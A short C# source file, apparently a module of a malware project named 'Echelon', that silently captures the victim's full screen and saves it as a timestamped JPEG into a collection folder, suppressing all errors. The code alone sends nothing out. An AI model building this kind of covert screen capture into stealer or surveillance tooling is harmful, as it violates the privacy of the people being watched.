

using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;

namespace Echelon
{
    internal class Screenshot
    {
        public static void GetScreenShot(string Echelon_Dir)
        {
            try
            {
                var width = Screen.PrimaryScreen.Bounds.Width;
                var height = Screen.PrimaryScreen.Bounds.Height;
                var bitmap = new Bitmap(width, height);
                Graphics.FromImage(bitmap).CopyFromScreen(0, 0, 0, 0, bitmap.Size);
                bitmap.Save(Echelon_Dir + "\\ScreenShot_" + Help.dateLog + ".Jpeg", ImageFormat.Jpeg);
            }
            catch { }
        }
    }
}
